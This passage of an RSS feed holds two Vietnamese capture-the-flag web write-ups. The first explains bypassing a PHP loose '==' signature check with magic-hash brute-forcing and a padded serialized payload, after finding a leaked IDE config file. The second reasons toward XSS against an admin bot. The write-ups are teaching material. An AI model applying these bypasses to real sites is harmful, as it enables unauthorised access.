data-recalc-dims="1" /></a></p>
+<p style="text-align: center;"><span id="more-642"></span></p>
+<p style="text-align: left;">Có thể là có cả những file cấu hình project - Information leak. Tiện sẵn máy mình cũng cài PHPStorm nên tạo luôn 1 project để xem thế nào</p>
+<p style="text-align: left;"><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?ssl=1"><img data-attachment-id="644" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/2-2/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?fit=490%2C165&amp;ssl=1" data-orig-size="490,165" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?fit=300%2C101&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?fit=490%2C165&amp;ssl=1" class="size-full wp-image-644 aligncenter" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?resize=490%2C165&#038;ssl=1" alt="" width="490" height="165" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?w=490&amp;ssl=1 490w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?resize=300%2C101&amp;ssl=1 300w" sizes="(max-width: 490px) 100vw, 490px" data-recalc-dims="1" /></a></p>
+<p style="text-align: left;">Như vậy là có các file như trong hình, thử vào <code>.idea/workspace.xml</code> và ...</p>
+<p style="text-align: left;"><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?ssl=1"><img data-attachment-id="645" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/3-2/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?fit=1063%2C596&amp;ssl=1" data-orig-size="1063,596" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="3" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?fit=300%2C168&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?fit=604%2C339&amp;ssl=1" class="size-full wp-image-645 aligncenter" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?resize=604%2C339&#038;ssl=1" alt="" width="604" height="339" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?w=1063&amp;ssl=1 1063w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?resize=300%2C168&amp;ssl=1 300w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?resize=768%2C431&amp;ssl=1 768w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?resize=1024%2C574&amp;ssl=1 1024w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p style="text-align: left;">Tiếp tục là 1 file php khác</p>
+<p style="text-align: left;"><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?ssl=1"><img data-attachment-id="646" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/4-3/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?fit=731%2C644&amp;ssl=1" data-orig-size="731,644" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="4.3" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?fit=300%2C264&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?fit=604%2C532&amp;ssl=1" class="size-full wp-image-646 aligncenter" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?resize=604%2C532&#038;ssl=1" alt="" width="604" height="532" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?w=731&amp;ssl=1 731w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?resize=300%2C264&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p style="text-align: left;">Phân tích kỹ ta có 1 đoạn compare lỗi <code>==</code> ở <code>if($realSign == $signature)</code></p>
+<p style="text-align: left;">Bypass bằng cách bruteforce input để md5sum của (input + unknown-key) = 0e[a-f0-9]{30} aka <strong><em><a href="https://www.whitehatsec.com/blog/magic-hashes/">magic hash</a></em></strong>, sau đó đến phần unserialize của $payload... hmm, không đơn giản lắm nhỉ, bruteforce mà vẫn phải unserialize được. Tuy nhiên thì ta có thể chèn thêm junk variables vào trong $payload mà deserialize không ảnh hưởng gì cả.</p>
+<p style="text-align: left;">Ví dụ</p>
+<p style="text-align: left;"><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?ssl=1"><img data-attachment-id="647" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/4-1/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?fit=584%2C252&amp;ssl=1" data-orig-size="584,252" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="4.1" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?fit=300%2C129&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?fit=584%2C252&amp;ssl=1" class="size-full wp-image-647 aligncenter" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?resize=584%2C252&#038;ssl=1" alt="" width="584" height="252" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?w=584&amp;ssl=1 584w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?resize=300%2C129&amp;ssl=1 300w" sizes="(max-width: 584px) 100vw, 584px" data-recalc-dims="1" /></a></p>
+<p style="text-align: left;"><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?ssl=1"><img data-attachment-id="648" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/4-2/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?fit=782%2C300&amp;ssl=1" data-orig-size="782,300" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="4.2" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?fit=300%2C115&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?fit=604%2C232&amp;ssl=1" class="size-full wp-image-648 aligncenter" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?resize=604%2C232&#038;ssl=1" alt="" width="604" height="232" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?w=782&amp;ssl=1 782w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?resize=300%2C115&amp;ssl=1 300w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?resize=768%2C295&amp;ssl=1 768w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p style="text-align: left;">Chạy 1 lúc (ở server cũ)</p>
+<p style="text-align: left;"><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?ssl=1"><img data-attachment-id="649" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/attachment/5/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?fit=956%2C385&amp;ssl=1" data-orig-size="956,385" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="5" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?fit=300%2C121&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?fit=604%2C243&amp;ssl=1" class="size-full wp-image-649 aligncenter" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?resize=604%2C243&#038;ssl=1" alt="" width="604" height="243" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?w=956&amp;ssl=1 956w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?resize=300%2C121&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?resize=768%2C309&amp;ssl=1 768w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p style="text-align: left;">Sử dụng auth trên để lấy flag + source cho phần thứ 2.</p>
+<p style="text-align: left;">&lt;continue&gt;</p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">642</post-id>	</item>
+		<item>
+		<title>WhiteHat Contest 11 -  Ultimate Design Tool</title>
+		<link>https://babyphd.net/2016/07/05/whitehat-contest-11-ultimate-design-tool/</link>
+				<pubDate>Tue, 05 Jul 2016 14:44:29 +0000</pubDate>
+		<dc:creator><![CDATA[justcallmedude]]></dc:creator>
+				<category><![CDATA[web]]></category>
+		<category><![CDATA[css]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=518</guid>
+				<description><![CDATA[Sau cơn mưa, đừng vội bỏ áo mưa (1 icon nào đó của vozforums) Nội dung bài viết được thực hiện trên 1 trang mà tôi tự tiện clone lại đề của Bkav. Nếu bạn đã đọc đến đây thì tức là bạn đang tìm kiếm lời giải cho 1 vấn đề, và hãy tiếp tục &#8230; <a href="https://babyphd.net/2016/07/05/whitehat-contest-11-ultimate-design-tool/" class="more-link">Continue reading <span class="screen-reader-text">WhiteHat Contest 11 -  Ultimate Design Tool</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p style="text-align: right;">Sau cơn mưa, đừng vội bỏ áo mưa (1 icon nào đó của vozforums)</p>
+<p style="text-align: right;"><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/07/20141214094521-baocaosu285.jpg?ssl=1" rel="attachment wp-att-543"><img data-attachment-id="543" data-permalink="https://babyphd.net/2016/07/05/whitehat-contest-11-ultimate-design-tool/20141214094521-baocaosu285/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/07/20141214094521-baocaosu285.jpg?fit=655%2C361&amp;ssl=1" data-orig-size="655,361" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20141214094521-baocaosu285" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/07/20141214094521-baocaosu285.jpg?fit=300%2C165&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/07/20141214094521-baocaosu285.jpg?fit=604%2C333&amp;ssl=1" class="alignnone size-medium wp-image-543" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/07/20141214094521-baocaosu285.jpg?resize=300%2C165&#038;ssl=1" alt="20141214094521-baocaosu285" width="300" height="165" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/07/20141214094521-baocaosu285.jpg?resize=300%2C165&amp;ssl=1 300w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/07/20141214094521-baocaosu285.jpg?w=655&amp;ssl=1 655w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
+<p>Nội dung bài viết được thực hiện trên 1 <a href="http://vz.damnctf.pw/1/">trang </a>mà tôi tự tiện clone lại đề của Bkav.<br />
+Nếu bạn đã đọc đến đây thì tức là bạn đang tìm kiếm lời giải cho 1 vấn đề, và hãy tiếp tục đọc xuống bên dưới, nếu bạn muốn tự khám phá thì hãy dừng lại ở đây và quay trở lại khi tạm thời chưa nghĩ ra ý tưởng, hoặc những ý tưởng của bạn đúng nhưng tôi lại setup sai <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f615.png" alt="😕" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<p><span id="more-518"></span></p>
+<p>Đề bài cho ta 1 đường link và dĩ nhiên theo quán tính tôi sờ tay vào ch...chuột click mở lấy vài cái cửa sổ, 1 cái view-source, 1 cái view page đã render.</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/1.png?ssl=1" rel="attachment wp-att-531"><img data-attachment-id="531" data-permalink="https://babyphd.net/2016/07/05/whitehat-contest-11-ultimate-design-tool/attachment/1/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/1.png?fit=916%2C598&amp;ssl=1" data-orig-size="916,598" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="1" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/1.png?fit=300%2C196&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/1.png?fit=604%2C394&amp;ssl=1" class="aligncenter wp-image-531 size-full" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/1.png?resize=604%2C394&#038;ssl=1" alt="1" width="604" height="394" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/1.png?w=916&amp;ssl=1 916w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/1.png?resize=300%2C196&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/1.png?resize=768%2C501&amp;ssl=1 768w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>Nếu bạn chưa quen làm việc với những challenge liên quan đến web, tôi khuyên bạn nên sử dụng công cụ proxy để theo dõi các request từ client và response. Nói cách khác, việc nắm bắt những hành động của challenge sẽ giúp bạn có cái nhìn tổng quan về attack surface. Tôi thấy mấy anh bạn hay dùng Chrome, nên tôi dùng luôn cái Developer tools của Chrome, bật "Preserve log" trong tab Network để những request cũ không bị xóa khi chuyển trang.<a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/2.png?ssl=1" rel="attachment wp-att-532"><img data-attachment-id="532" data-permalink="https://babyphd.net/2016/07/05/whitehat-contest-11-ultimate-design-tool/attachment/2/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/2.png?fit=1036%2C593&amp;ssl=1" data-orig-size="1036,593" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/2.png?fit=300%2C172&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/2.png?fit=604%2C346&amp;ssl=1" class="aligncenter wp-image-532 size-full" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/2.png?resize=604%2C346&#038;ssl=1" alt="2" width="604" height="346" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/2.png?w=1036&amp;ssl=1 1036w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/2.png?resize=300%2C172&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/2.png?resize=768%2C440&amp;ssl=1 768w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/2.png?resize=1024%2C586&amp;ssl=1 1024w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>Sơ bộ khi nhấn "Share your button!" sẽ có 1 request gửi đi với những tham số mà tôi nhập trong hình, cách xử lý dữ liệu gửi đi từ client rõ hơn trong file app.js, hướng đến push.php</p>
+<p>&nbsp;</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/3.png?ssl=1" rel="attachment wp-att-533"><img data-attachment-id="533" data-permalink="https://babyphd.net/2016/07/05/whitehat-contest-11-ultimate-design-tool/attachment/3/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/3.png?fit=1028%2C600&amp;ssl=1" data-orig-size="1028,600" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="3" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/3.png?fit=300%2C175&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/3.png?fit=604%2C353&amp;ssl=1" class="aligncenter wp-image-533 size-full" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/3.png?resize=604%2C353&#038;ssl=1" alt="3" width="604" height="353" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/3.png?w=1028&amp;ssl=1 1028w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/3.png?resize=300%2C175&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/3.png?resize=768%2C448&amp;ssl=1 768w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/3.png?resize=1024%2C598&amp;ssl=1 1024w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>Quan sát response, ta thấy điểm chung là có dữ liệu giống như trong request gửi đi. Một trang design button có chức năng share, là bước đầu của việc share + tín dụng (1 icon nào đó từ voz). Nếu chỉ có mình đọc được thì hơi chán, dẫn đến một vài phán đoán là có người thứ 2 đọc được, người ấy, chắc chắn không phải người yêu mình, mà là 1 thứ gì đó gọi là bot, hay flag keeper. Tình huống này rất có thể là client-side attack mà thông thường là XSS (đôi khi xuất hiện trong các kì CTF gần đây).</p>
+<p>Có thêm 1 dữ kiện nữa là có 1 thành phần được comment trong code</p>
+<pre class="toolbar:2 toolbar-overlay:false toolbar-hide:false lang:default decode:true ">&lt;!-- Admin only ... 
+&lt;span value="secret"&gt;&lt;/span&gt; 
+--&gt;</pre>
+<p>Tốt nhất là chiếm được phiên của admin để có được secret (có thể là flag luôn). Tóm lại là mình sẽ ngồi chèn javascript để get source code của cái trang admin đấy, bao gồm cả secret value luôn.</p>
+<p>Việc dự đoán như vậy rất dễ khiến con nhà người ta đi sai hướng và không lấy được flag, ví dụ như người ra để muốn mình khai thác sql injection, hay command injection, các loại tiêm chủng mở rộng mà mình cứ đâm đầu vào khai thác XSS chẳng hạn. Đó là lý do tại sao bạn nên kiểm tra tất cả các khả năng mà bạn có thể nghĩ ra, chuyển hướng hoặc chuyển sang làm bài khác, hoặc blame admin đến khi có đội làm ra (đôi khi đề deploy có sơ suất nên không thể giải được).</p>
+<p>Bài này mình đã bị sai hướng, rõ ràng là inject javascript rất đơn giản, mặc dù tất cả các ký tự đi qua đều đã bị lowercase- cần nhiều hơn (cụ thể là len(charset)*2) điều kiện blind.</p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">518</post-id>	</item>
+	</channel>
+</rss>
